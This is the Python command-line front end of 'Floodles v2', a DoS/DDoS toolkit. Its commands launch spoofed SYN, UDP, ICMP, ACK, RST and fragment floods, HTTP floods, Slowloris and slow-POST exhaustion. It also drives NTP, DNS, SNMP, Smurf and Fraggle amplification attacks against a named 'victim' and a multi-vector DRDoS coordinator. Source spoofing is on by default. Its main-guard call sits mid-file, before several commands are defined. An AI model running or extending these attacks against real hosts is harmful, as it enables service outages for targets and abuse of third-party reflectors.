#!/usr/bin/env python3
"""
cli/main.py - Floodles CLI v2
Unified CLI: attack modules + profiler + config profiles + live dashboard.

Commands:
  syn     TCP SYN flood
  udp     UDP volumetric flood
  icmp    ICMP echo flood
  http    Async HTTP/HTTPS flood (Layer 7)
  slow    Slowloris socket exhaustion
  ntp     NTP monlist amplification
  xmas    XMAS (all-flags) flood
  ack     ACK flood (stateless firewall bypass)
  dns     DNS amplification
  profile Run from YAML config file
  scan    Target profiler (pre-attack recon)
  gen     Generate example YAML profile
  man     Built-in manual pages for attack modules
"""

import sys
import time
import signal
import threading

try:
    import click
except ImportError:
    print("[!] click not installed: pip install click")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _run_attack(engine, dashboard, logger=None) -> None:
    """Wire engine -> dashboard -> logger and block until done."""
    dashboard.attach(engine)
    dashboard.start()

    stop_event = threading.Event()

    def _sig(sig, frame):
        click.echo("\n[*] Interrupted. Stopping...")
        engine.stop()
        stop_event.set()

    signal.signal(signal.SIGINT, _sig)

    engine.wait()
    stop_event.set()
    dashboard.stop()

    summary = engine.metrics.summary() if hasattr(engine, "metrics") else {}
    if logger:
        logger.stop(summary)

    click.echo(f"\n[+] Session complete.")
    if summary:
        _print_summary(summary)


def _print_summary(s: dict) -> None:
    try:
        from rich.console import Console
        from rich.table import Table
        from rich import box
        c = Console()
        t = Table(box=box.SIMPLE, show_header=False)
        t.add_column("Key", style="dim")
        t.add_column("Value", style="bold cyan")
        for k, v in s.items():
            t.add_row(str(k), str(v))
        c.print(t)
    except ImportError:
        click.echo(s)


def _make_logger(module: str, target: str, params: dict):
    try:
        from floodles.utils.logger import get_logger
        return get_logger(module, target, params)
    except Exception:
        return None


def _make_dash(module: str, target: str, params: dict,
               duration: int, log_path: str = ""):
    from floodles.cli.dashboard import make_dashboard
    return make_dashboard(module, target, params, duration, log_path)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _parse_reflectors(value: str) -> list:
    """Parse reflector IPs from a comma-separated string or @filename.

    Supports:
      - "1.2.3.4,5.6.7.8"   comma-separated IPs
      - "@/path/to/file.txt" one IP per line, # comments and blank lines ignored
    """
    import ipaddress
    if value.startswith("@"):
        path = value[1:]
        try:
            with open(path) as f:
                lines = f.readlines()
        except OSError as e:
            raise click.BadParameter(f"Cannot read reflectors file {path!r}: {e}")
        entries = [l.split("#")[0].strip() for l in lines]
    else:
        entries = [r.strip() for r in value.split(",")]
    valid = []
    for e in entries:
        if not e:
            continue
        try:
            ipaddress.ip_address(e)
            valid.append(e)
        except ValueError:
            click.echo(f"[!] Skipping invalid IP in reflectors: {e!r}", err=True)
    if not valid:
        raise click.BadParameter("No valid IP addresses found in reflectors list.")
    return valid


# ---------------------------------------------------------------------------
# CLI root
# ---------------------------------------------------------------------------

@click.group()
@click.version_option("2.0.0", prog_name="floodles")
def cli():
    """
    Floodles v2 - Modular DoS/DDoS testing toolkit.

    \b
    Raw socket modules (syn, udp, icmp, xmas, ack, ntp, dns) require root.
    Layer 7 modules (http, slow) do NOT require root.
    """


# --- SYN Flood --------------------------------------------------------------
@cli.command()
@click.argument("target")
@click.argument("port", type=int)
@click.option("--threads",  "-t", default=16,  show_default=True)
@click.option("--pps",            default=0,   show_default=True, help="PPS cap (0=unlimited)")
@click.option("--duration", "-d", default=30,  show_default=True)
@click.option("--no-spoof",       is_flag=True)
@click.option("--no-log",         is_flag=True)
def syn(target, port, threads, pps, duration, no_spoof, no_log):
    """TCP SYN flood. Half-open state exhaustion. [root]"""
    from floodles.modules import syn_flood
    params = dict(port=port, threads=threads, pps=pps, duration=duration, spoof=not no_spoof)
    logger = None if no_log else _make_logger("syn_flood", target, params)
    dash = _make_dash("syn_flood", target, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] SYN flood -> {target}:{port}")
    engine = syn_flood.run(target, port, threads=threads, pps_limit=pps,
                           duration=duration, spoof=not no_spoof)
    _run_attack(engine, dash, logger)


# --- UDP Flood --------------------------------------------------------------
@cli.command()
@click.argument("target")
@click.option("--port",     "-p", default=0,    show_default=True, help="Port (0=random)")
@click.option("--size",     "-s", default=512,  show_default=True, help="Payload bytes")
@click.option("--threads",  "-t", default=8,    show_default=True)
@click.option("--pps",            default=0,    show_default=True)
@click.option("--duration", "-d", default=30,   show_default=True)
@click.option("--no-spoof",       is_flag=True)
@click.option("--no-log",         is_flag=True)
def udp(target, port, size, threads, pps, duration, no_spoof, no_log):
    """UDP volumetric flood. [root]"""
    from floodles.modules import udp_flood
    params = dict(port=port, size=size, threads=threads, duration=duration)
    logger = None if no_log else _make_logger("udp_flood", target, params)
    dash = _make_dash("udp_flood", target, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] UDP flood -> {target}:{port if port else 'rand'}")
    engine = udp_flood.run(target, port, payload_size=size, threads=threads,
                           pps_limit=pps, duration=duration, spoof=not no_spoof)
    _run_attack(engine, dash, logger)


# --- ICMP Flood -------------------------------------------------------------
@cli.command()
@click.argument("target")
@click.option("--size",     "-s", default=56,  show_default=True)
@click.option("--threads",  "-t", default=8,   show_default=True)
@click.option("--pps",            default=0,   show_default=True)
@click.option("--duration", "-d", default=30,  show_default=True)
@click.option("--no-spoof",       is_flag=True)
@click.option("--no-log",         is_flag=True)
def icmp(target, size, threads, pps, duration, no_spoof, no_log):
    """ICMP echo flood (ping flood). [root]"""
    from floodles.modules import icmp_flood
    params = dict(size=size, threads=threads, duration=duration)
    logger = None if no_log else _make_logger("icmp_flood", target, params)
    dash = _make_dash("icmp_flood", target, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] ICMP flood -> {target}")
    engine = icmp_flood.run(target, payload_size=size, threads=threads,
                            pps_limit=pps, duration=duration, spoof=not no_spoof)
    _run_attack(engine, dash, logger)


# --- XMAS Flood -------------------------------------------------------------
@cli.command()
@click.argument("target")
@click.argument("port", type=int)
@click.option("--threads",  "-t", default=8,  show_default=True)
@click.option("--pps",            default=0,  show_default=True)
@click.option("--duration", "-d", default=30, show_default=True)
@click.option("--no-spoof",       is_flag=True)
@click.option("--no-log",         is_flag=True)
def xmas(target, port, threads, pps, duration, no_spoof, no_log):
    """XMAS flood (all TCP flags). IDS/firewall bypass testing. [root]"""
    from floodles.modules import xmas_flood
    params = dict(port=port, threads=threads, duration=duration)
    logger = None if no_log else _make_logger("xmas_flood", target, params)
    dash = _make_dash("xmas_flood", target, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] XMAS flood -> {target}:{port}")
    engine = xmas_flood.run(target, port, threads=threads, pps_limit=pps,
                            duration=duration, spoof=not no_spoof)
    _run_attack(engine, dash, logger)


# --- ACK Flood --------------------------------------------------------------
@cli.command()
@click.argument("target")
@click.argument("port", type=int)
@click.option("--threads",  "-t", default=8,  show_default=True)
@click.option("--pps",            default=0,  show_default=True)
@click.option("--duration", "-d", default=30, show_default=True)
@click.option("--no-spoof",       is_flag=True)
@click.option("--no-log",         is_flag=True)
def ack(target, port, threads, pps, duration, no_spoof, no_log):
    """ACK flood. Stateless firewall bypass testing. [root]"""
    from floodles.modules import ack_flood
    params = dict(port=port, threads=threads, duration=duration)
    logger = None if no_log else _make_logger("ack_flood", target, params)
    dash = _make_dash("ack_flood", target, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] ACK flood -> {target}:{port}")
    engine = ack_flood.run(target, port, threads=threads, pps_limit=pps,
                           duration=duration, spoof=not no_spoof)
    _run_attack(engine, dash, logger)


# --- HTTP Flood -------------------------------------------------------------
@cli.command()
@click.argument("url")
@click.option("--method",      "-m", default="GET",
              type=click.Choice(["GET", "POST"]), show_default=True)
@click.option("--concurrency", "-c", default=512,  show_default=True)
@click.option("--duration",    "-d", default=30,   show_default=True)
@click.option("--post-size",         default=1024, show_default=True)
@click.option("--no-bust",           is_flag=True, help="Disable cache busting")
@click.option("--no-log",            is_flag=True)
def http(url, method, concurrency, duration, post_size, no_bust, no_log):
    """Async HTTP/HTTPS flood (Layer 7). No root required."""
    from floodles.modules import http_flood
    params = dict(method=method, concurrency=concurrency, duration=duration)
    logger = None if no_log else _make_logger("http_flood", url, params)
    dash = _make_dash("http_flood", url, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] HTTP {method} flood -> {url}")
    engine = http_flood.run(url, method=method, concurrency=concurrency,
                            duration=duration, cache_bust=not no_bust,
                            post_size=post_size)
    _run_attack(engine, dash, logger)


# --- Slowloris --------------------------------------------------------------
@cli.command()
@click.argument("target")
@click.option("--port",     "-p", default=80,   show_default=True)
@click.option("--sockets",  "-s", default=200,  show_default=True)
@click.option("--interval", "-i", default=10.0, show_default=True)
@click.option("--duration", "-d", default=60,   show_default=True)
@click.option("--ssl",            is_flag=True)
@click.option("--no-log",         is_flag=True)
def slow(target, port, sockets, interval, duration, ssl, no_log):
    """Slowloris: slow HTTP socket exhaustion. No root required."""
    from floodles.modules import slowloris
    params = dict(port=port, sockets=sockets, interval=interval,
                  ssl=ssl, duration=duration)
    logger = None if no_log else _make_logger("slowloris", target, params)
    dash = _make_dash("slowloris", target, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] Slowloris -> {target}:{port}  ssl={ssl}")
    engine = slowloris.run(target, port=port, socket_count=sockets,
                           keep_alive_interval=interval, duration=duration,
                           use_ssl=ssl)
    _run_attack(engine, dash, logger)


# --- NTP Amplification ------------------------------------------------------
@cli.command()
@click.argument("victim")
@click.option("--reflectors", "-r", required=True,
              help="Comma-separated reflector IPs")
@click.option("--threads",    "-t", default=8,  show_default=True)
@click.option("--pps",              default=0,  show_default=True)
@click.option("--duration",   "-d", default=30, show_default=True)
@click.option("--no-log",           is_flag=True)
def ntp(victim, reflectors, threads, pps, duration, no_log):
    """NTP monlist amplification (~550x). [root]"""
    from floodles.modules import ntp_amp
    ref_list = _parse_reflectors(reflectors)
    params = dict(reflectors=len(ref_list), threads=threads, duration=duration)
    logger = None if no_log else _make_logger("ntp_amp", victim, params)
    dash = _make_dash("ntp_amp", victim, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] NTP amp -> victim={victim}  reflectors={len(ref_list)}")
    engine = ntp_amp.run(victim, ref_list, threads=threads,
                         pps_limit=pps, duration=duration)
    _run_attack(engine, dash, logger)


# --- DNS Amplification ------------------------------------------------------
@cli.command()
@click.argument("victim")
@click.option("--reflectors", "-r", required=True,
              help="Comma-separated open resolver IPs")
@click.option("--query",            default="isc.org",  show_default=True)
@click.option("--qtype",            default="ANY",       show_default=True)
@click.option("--threads",    "-t", default=8,  show_default=True)
@click.option("--pps",              default=0,  show_default=True)
@click.option("--duration",   "-d", default=30, show_default=True)
@click.option("--no-rotate",        is_flag=True, help="Disable query rotation")
@click.option("--no-rand-sub",      is_flag=True, help="Disable random subdomain per packet (cache bypass)")
@click.option("--no-log",           is_flag=True)
def dns(victim, reflectors, query, qtype, threads, pps, duration, no_rotate, no_rand_sub, no_log):
    """DNS amplification/reflection attack. [root]"""
    from floodles.modules import dns_amp
    ref_list = _parse_reflectors(reflectors)
    params = dict(reflectors=len(ref_list), query=query, qtype=qtype,
                  threads=threads, duration=duration)
    logger = None if no_log else _make_logger("dns_amp", victim, params)
    dash = _make_dash("dns_amp", victim, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] DNS amp -> victim={victim}  resolvers={len(ref_list)}")
    engine = dns_amp.run(victim, ref_list, query=query, qtype=qtype,
                         threads=threads, pps_limit=pps, duration=duration,
                         rotate_queries=not no_rotate, rand_sub=not no_rand_sub)
    _run_attack(engine, dash, logger)


# --- Profile (YAML) ---------------------------------------------------------
@cli.command()
@click.argument("profile_path", metavar="PROFILE")
def profile(profile_path):
    """Run attack from a YAML profile file."""
    import importlib
    from floodles.config.loader import load, ConfigError
    try:
        cfg = load(profile_path)
    except (FileNotFoundError, ConfigError) as e:
        click.echo(f"[!] {e}", err=True)
        sys.exit(1)

    module_name = cfg["module"]
    target = cfg["target"]
    params = cfg.get("params", {})
    meta = cfg.get("meta", {})

    if meta.get("name"):
        click.echo(f"[*] Profile: {meta['name']}")
    click.echo(f"[*] Module: {module_name}  Target: {target}")

    try:
        mod = importlib.import_module(f"floodles.modules.{module_name}")
        engine = mod.run(target, **params)
    except Exception as e:
        click.echo(f"[!] Failed to launch: {e}", err=True)
        sys.exit(1)

    duration = params.get("duration", 0)
    dash = _make_dash(module_name, target, params, duration)
    logger = _make_logger(module_name, target, params)
    _run_attack(engine, dash, logger)


# --- Scan (target profiler) -------------------------------------------------
@cli.command()
@click.argument("target")
@click.option("--ports",   default="",   help="Comma-separated ports (default: top 22)")
@click.option("--workers", default=50,   show_default=True)
@click.option("--timeout", default=1.0,  show_default=True, type=float)
@click.option("--ntp",     "check_ntp",  is_flag=True, help="Probe NTP monlist")
def scan(target, ports, workers, timeout, check_ntp):
    """Pre-attack target profiler: port scan, OS guess, HTTP banner, NTP probe."""
    from floodles.utils.profiler import profile as do_profile
    port_list = None
    if ports:
        try:
            port_list = [int(p.strip()) for p in ports.split(",") if p.strip()]
        except ValueError:
            click.echo("[!] Invalid port list", err=True)
            sys.exit(1)
    click.echo(f"[*] Profiling {target}...")
    result = do_profile(target, ports=port_list, port_workers=workers,
                        timeout=timeout, check_ntp=check_ntp)
    result.print_summary()


# --- Gen (example YAML profile) ---------------------------------------------
@cli.command()
@click.argument("module")
@click.argument("output", default="profile.yaml")
def gen(module, output):
    """Generate an example YAML attack profile. MODULE: syn_flood|http_flood|..."""
    from floodles.config.loader import generate_example, ConfigError
    try:
        generate_example(module, output)
        click.echo(f"[+] Profile written: {output}")
    except (ConfigError, ImportError) as e:
        click.echo(f"[!] {e}", err=True)
        sys.exit(1)


# --- Slow POST --------------------------------------------------------------
@cli.command("slowpost")
@click.argument("target")
@click.option("--port",     "-p", default=80,          show_default=True)
@click.option("--sockets",  "-s", default=150,         show_default=True)
@click.option("--interval", "-i", default=10.0,        show_default=True)
@click.option("--cl",             default=10_000_000,  show_default=True,
              help="Content-Length declared (bytes)")
@click.option("--duration", "-d", default=60,          show_default=True)
@click.option("--ssl",            is_flag=True)
@click.option("--no-log",         is_flag=True)
def slowpost(target, port, sockets, interval, cl, duration, ssl, no_log):
    """Slow POST (RUDY): incomplete body exhaustion. No root required."""
    from floodles.modules import slow_post
    params = dict(port=port, sockets=sockets, interval=interval,
                  content_length=cl, ssl=ssl, duration=duration)
    logger = None if no_log else _make_logger("slow_post", target, params)
    dash = _make_dash("slow_post", target, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] Slow POST -> {target}:{port}  sockets={sockets}  CL={cl:,}B")
    engine = slow_post.run(target, port=port, socket_count=sockets,
                           interval=interval, content_length=cl,
                           duration=duration, use_ssl=ssl)
    _run_attack(engine, dash, logger)


# --- RST/FIN Flood ----------------------------------------------------------
@cli.command("rst")
@click.argument("target")
@click.argument("port", type=int)
@click.option("--flag",     default="R",
              type=click.Choice(["R", "F", "RF"]), show_default=True)
@click.option("--threads",  "-t", default=8,  show_default=True)
@click.option("--pps",            default=0,  show_default=True)
@click.option("--duration", "-d", default=30, show_default=True)
@click.option("--no-spoof",       is_flag=True)
@click.option("--no-log",         is_flag=True)
def rst(target, port, flag, threads, pps, duration, no_spoof, no_log):
    """RST/FIN flood. Forceful connection teardown. [root]"""
    from floodles.modules import rst_flood
    params = dict(port=port, flag=flag, threads=threads, duration=duration)
    logger = None if no_log else _make_logger("rst_flood", target, params)
    dash = _make_dash("rst_flood", target, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] RST/FIN ({flag}) flood -> {target}:{port}")
    engine = rst_flood.run(target, port, flag=flag, threads=threads,
                           pps_limit=pps, duration=duration, spoof=not no_spoof)
    _run_attack(engine, dash, logger)


# --- IP Fragmentation -------------------------------------------------------
@cli.command("frag")
@click.argument("target")
@click.option("--port",     "-p", default=80,     show_default=True)
@click.option("--variant",        default="flood",
              type=click.Choice(["flood", "last_only"]), show_default=True)
@click.option("--threads",  "-t", default=8,      show_default=True)
@click.option("--pps",            default=0,      show_default=True)
@click.option("--duration", "-d", default=30,     show_default=True)
@click.option("--no-spoof",       is_flag=True)
@click.option("--no-log",         is_flag=True)
def frag(target, port, variant, threads, pps, duration, no_spoof, no_log):
    """IP fragmentation attack. Exhausts kernel reassembly buffers. [root]"""
    from floodles.modules import ip_frag
    params = dict(port=port, variant=variant, threads=threads, duration=duration)
    logger = None if no_log else _make_logger("ip_frag", target, params)
    dash = _make_dash("ip_frag", target, params, duration,
                      str(logger.path) if logger else "")
    click.echo(f"[*] IP frag ({variant}) -> {target}:{port}")
    engine = ip_frag.run(target, dst_port=port, threads=threads,
                         pps_limit=pps, duration=duration,
                         spoof=not no_spoof, variant=variant)
    _run_attack(engine, dash, logger)


# ---------------------------------------------------------------------------

if __name__ == "__main__":
    cli()


# --- SNIPER (SNMP reflection) -----------------------------------------------
@cli.command()
@click.argument("victim")
@click.option("--reflectors",     "-r", required=True,
              help="Comma-separated SNMP agent IPs (port 161)")
@click.option("--community",            default="public", show_default=True)
@click.option("--max-repetitions",      default=255,      show_default=True,
              help="GetBulk repetitions (255=max amplification ~650x)")
@click.option("--threads",        "-t", default=8,  show_default=True)
@click.option("--pps",                  default=0,  show_default=True)
@click.option("--duration",       "-d", default=30, show_default=True)
@click.option("--no-log",               is_flag=True)
def sniper(victim, reflectors, community, max_repetitions, threads, pps, duration, no_log):
    """SNMP reflection amplification (~650x). [root]"""
    from floodles.modules import sniper as sniper_mod
    ref_list = _parse_reflectors(reflectors)
    params = dict(reflectors=len(ref_list), community=community,
                  max_rep=max_repetitions, threads=threads, duration=duration)
    logger = None if no_log else _make_logger("sniper", victim, params)
    dash   = _make_dash("sniper", victim, params, duration,
                        str(logger.path) if logger else "")
    click.echo(f"[*] SNMP amp -> victim={victim}  reflectors={len(ref_list)}  "
               f"community={community}  factor=~650x")
    engine = sniper_mod.run(victim, ref_list, community=community,
                            max_repetitions=max_repetitions,
                            threads=threads, pps_limit=pps, duration=duration)
    _run_attack(engine, dash, logger)


# --- TACHYON (SYN-ACK flood) ------------------------------------------------
@cli.command()
@click.argument("target")
@click.option("--port",        "-p", default=80,        show_default=True)
@click.option("--mode",              default="direct",
              type=click.Choice(["direct", "reflected"]), show_default=True)
@click.option("--reflectors",  "-r", default="",
              help="Comma-separated reflectors (mode=reflected only)")
@click.option("--ref-port",          default=80,        show_default=True)
@click.option("--threads",     "-t", default=8,         show_default=True)
@click.option("--pps",               default=0,         show_default=True)
@click.option("--duration",    "-d", default=30,        show_default=True)
@click.option("--no-log",            is_flag=True)
def tachyon(target, port, mode, reflectors, ref_port, threads, pps, duration, no_log):
    """SYN-ACK flood. Direct or reflected mode. [root]"""
    from floodles.modules import tachyon as tachyon_mod
    ref_list = _parse_reflectors(reflectors) if reflectors else []
    params   = dict(port=port, mode=mode, threads=threads, duration=duration)
    logger   = None if no_log else _make_logger("tachyon", target, params)
    dash     = _make_dash("tachyon", target, params, duration,
                          str(logger.path) if logger else "")
    click.echo(f"[*] TACHYON SYN-ACK -> {target}:{port}  mode={mode}")
    engine = tachyon_mod.run(target, dst_port=port, mode=mode,
                             reflectors=ref_list or None,
                             reflector_port=ref_port,
                             threads=threads, pps_limit=pps, duration=duration)
    _run_attack(engine, dash, logger)


# --- FRAGGLE (UDP broadcast amplification) ----------------------------------
@cli.command()
@click.argument("victim")
@click.option("--broadcasts",  "-b", required=True,
              help="Comma-separated broadcast addresses or CIDRs in scope")
@click.option("--port",        "-p", default=7,   show_default=True,
              help="7=echo, 19=chargen")
@click.option("--size",        "-s", default=64,  show_default=True)
@click.option("--threads",     "-t", default=8,   show_default=True)
@click.option("--duration",    "-d", default=30,  show_default=True)
@click.option("--no-log",            is_flag=True)
def fraggle(victim, broadcasts, port, size, threads, duration, no_log):
    """Fraggle UDP broadcast amplification. [root]"""
    from floodles.modules import fraggle as fraggle_mod
    bcast_list = [b.strip() for b in broadcasts.split(",") if b.strip()]
    params     = dict(broadcasts=len(bcast_list), port=port, duration=duration)
    logger     = None if no_log else _make_logger("fraggle", victim, params)
    dash       = _make_dash("fraggle", victim, params, duration,
                            str(logger.path) if logger else "")
    click.echo(f"[*] FRAGGLE -> victim={victim}  broadcasts={len(bcast_list)}  port={port}")
    engine = fraggle_mod.run(victim, bcast_list, port=port,
                             payload_size=size, threads=threads, duration=duration)
    _run_attack(engine, dash, logger)


# --- SMURF (ICMP broadcast amplification) -----------------------------------
@cli.command()
@click.argument("victim")
@click.option("--broadcasts",  "-b", required=True,
              help="Comma-separated broadcast addresses or CIDRs in scope")
@click.option("--size",        "-s", default=64, show_default=True)
@click.option("--threads",     "-t", default=8,  show_default=True)
@click.option("--duration",    "-d", default=30, show_default=True)
@click.option("--no-log",            is_flag=True)
def smurf(victim, broadcasts, size, threads, duration, no_log):
    """Smurf ICMP broadcast amplification. [root]"""
    from floodles.modules import smurf as smurf_mod
    bcast_list = [b.strip() for b in broadcasts.split(",") if b.strip()]
    params     = dict(broadcasts=len(bcast_list), duration=duration)
    logger     = None if no_log else _make_logger("smurf", victim, params)
    dash       = _make_dash("smurf", victim, params, duration,
                            str(logger.path) if logger else "")
    click.echo(f"[*] SMURF -> victim={victim}  broadcasts={len(bcast_list)}")
    engine = smurf_mod.run(victim, bcast_list, payload_size=size,
                           threads=threads, duration=duration)
    _run_attack(engine, dash, logger)


# --- OVERLAP (fragment overlap / Teardrop) ----------------------------------
@cli.command()
@click.argument("target")
@click.option("--port",        "-p", default=80,         show_default=True)
@click.option("--variant",           default="teardrop",
              type=click.Choice(["teardrop", "rose", "tiny"]), show_default=True)
@click.option("--threads",     "-t", default=8,          show_default=True)
@click.option("--pps",               default=0,          show_default=True)
@click.option("--duration",    "-d", default=30,         show_default=True)
@click.option("--no-spoof",          is_flag=True)
@click.option("--no-log",            is_flag=True)
def overlap(target, port, variant, threads, pps, duration, no_spoof, no_log):
    """Fragment overlap attack (Teardrop/Rose/Tiny). [root]"""
    from floodles.modules import overlap as overlap_mod
    params = dict(port=port, variant=variant, threads=threads, duration=duration)
    logger = None if no_log else _make_logger("overlap", target, params)
    dash   = _make_dash("overlap", target, params, duration,
                        str(logger.path) if logger else "")
    click.echo(f"[*] OVERLAP ({variant}) -> {target}:{port}")
    engine = overlap_mod.run(target, dst_port=port, variant=variant,
                             threads=threads, pps_limit=pps, duration=duration,
                             spoof=not no_spoof)
    _run_attack(engine, dash, logger)


# --- NUKE (TCP starvation) --------------------------------------------------
@cli.command()
@click.argument("target")
@click.option("--port",        "-p", default=80,      show_default=True)
@click.option("--sockets",     "-s", default=500,     show_default=True)
@click.option("--variant",           default="hold",
              type=click.Choice(["hold", "window0", "persist"]), show_default=True)
@click.option("--interval",    "-i", default=30.0,    show_default=True,
              help="Persist keep-alive interval (seconds)")
@click.option("--duration",    "-d", default=60,      show_default=True)
@click.option("--ssl",               is_flag=True)
@click.option("--no-log",            is_flag=True)
def nuke(target, port, sockets, variant, interval, duration, ssl, no_log):
    """TCP starvation: fill server connection table. No root required."""
    from floodles.modules import nuke as nuke_mod
    params = dict(port=port, sockets=sockets, variant=variant, duration=duration)
    logger = None if no_log else _make_logger("nuke", target, params)
    dash   = _make_dash("nuke", target, params, duration,
                        str(logger.path) if logger else "")
    click.echo(f"[*] NUKE ({variant}) -> {target}:{port}  sockets={sockets}")
    engine = nuke_mod.run(target, port=port, socket_count=sockets,
                          variant=variant, persist_interval=interval,
                          duration=duration, use_ssl=ssl)
    _run_attack(engine, dash, logger)


# --- SPRAY (multi-vector DRDoS) ---------------------------------------------
@cli.command()
@click.argument("victim")
@click.option("--config",  "-c", required=True,
              help="YAML file defining vectors (see config/examples/spray.yaml)")
@click.option("--duration", "-d", default=30, show_default=True)
@click.option("--no-log",         is_flag=True)
def spray(victim, config, duration, no_log):
    """Multi-vector DRDoS coordinator (NTP+DNS+SNMP simultaneously). [root]"""
    import yaml
    from floodles.modules import spray as spray_mod

    try:
        with open(config) as f:
            cfg = yaml.safe_load(f)
        vectors = cfg.get("vectors", [])
    except Exception as e:
        click.echo(f"[!] Failed to load config: {e}", err=True)
        import sys; sys.exit(1)

    params = dict(vectors=len(vectors), duration=duration)
    logger = None if no_log else _make_logger("spray", victim, params)
    click.echo(f"[*] SPRAY -> victim={victim}  vectors={len(vectors)}")
    engine = spray_mod.run(victim, vectors=vectors, duration=duration)

    # SprayEngine has different metric structure - simple wait
    import signal
    def _sig(s, f):
        engine.stop()
    signal.signal(signal.SIGINT, _sig)
    engine.wait()
    if logger:
        logger.stop(engine.metrics.summary())
    click.echo(f"\n[+] Done. {engine.metrics.summary()}")


# --- Detect native backends -------------------------------------------------
@cli.command()
@click.option("--compile", "auto_compile", is_flag=True,
              help="Try to compile missing libs")
def detect(auto_compile):
    """Detect and report available native backends (C, Rust, Go)."""
    from floodles.core.native_bridge import detect as do_detect
    status = do_detect(auto_compile=auto_compile, verbose=True)
    if all(status.values()):
        click.echo("\n[+] All native backends available. Maximum performance.")
    elif not any(status.values()):
        click.echo("\n[*] No native backends. Run 'make' in project root to build.")
    else:
        missing = [k for k, v in status.items() if not v]
        click.echo(f"\n[!] Missing: {', '.join(missing)}. Run 'make' to build.")


# --- Man pages --------------------------------------------------------------
@cli.command("man")
@click.argument("module", default="")
@click.option("--list", "show_list", is_flag=True, help="List all documented modules")
def man(module, show_list):
    """Built-in manual pages for attack modules.\n\nUsage: floodles man syn"""
    from floodles.cli.man import render, list_modules
    if show_list or not module:
        list_modules()
    else:
        render(module)
